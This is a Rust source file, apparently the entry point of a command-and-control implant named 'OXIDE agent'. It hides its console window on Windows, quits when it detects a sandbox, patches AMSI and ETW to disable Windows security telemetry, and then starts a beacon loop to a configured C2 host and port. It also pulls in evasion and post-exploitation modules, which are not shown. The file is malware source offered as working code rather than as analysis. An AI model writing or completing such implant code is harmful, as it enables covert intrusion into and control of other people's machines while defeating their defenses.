// Hide the console window when running on Windows
#![cfg_attr(windows, windows_subsystem = "windows")]
#![allow(dead_code, unused_imports, unused_variables)]

mod beacon;
mod comms;
mod config;
mod debug;
mod evasion;
mod postex;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    // Write crash info to a temp file so silent panics are diagnosable
    #[cfg(target_os = "windows")]
    std::panic::set_hook(Box::new(|info| {
        let tmp = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Temp".into());
        let msg = format!("[OXIDE PANIC] {info}\n");
        let _ = std::fs::write(format!("{tmp}\\oxide_panic.txt"), msg);
    }));

    dbg_log!("=== OXIDE agent starting ===");

    dbg_log!("loading config...");
    let cfg = config::load();
    dbg_log!("config ok — build_id={} c2={}:{} proto={} sleep={}ms",
        cfg.build_id, cfg.c2_host, cfg.c2_port, cfg.protocol, cfg.sleep_ms);

    if cfg.sandbox_evasion {
        dbg_log!("running sandbox checks...");
        if evasion::is_sandbox() {
            dbg_log!("sandbox detected — exiting");
            return Ok(());
        }
        dbg_log!("sandbox checks passed");
    }

    dbg_log!("hardening process (block_dlls={})", cfg.block_dlls);
    evasion::harden(cfg.block_dlls);

    if cfg.amsi_bypass {
        dbg_log!("patching AMSI...");
        evasion::amsi::patch();
        dbg_log!("AMSI patched");
    }
    if cfg.etw_bypass {
        dbg_log!("patching ETW...");
        evasion::etw::patch();
        dbg_log!("ETW patched");
    }

    dbg_log!("starting beacon loop");
    if let Err(e) = beacon::run(cfg).await {
        dbg_log!("beacon loop error: {e}");
        return Err(e);
    }

    dbg_log!("agent exiting cleanly");
    Ok(())
}
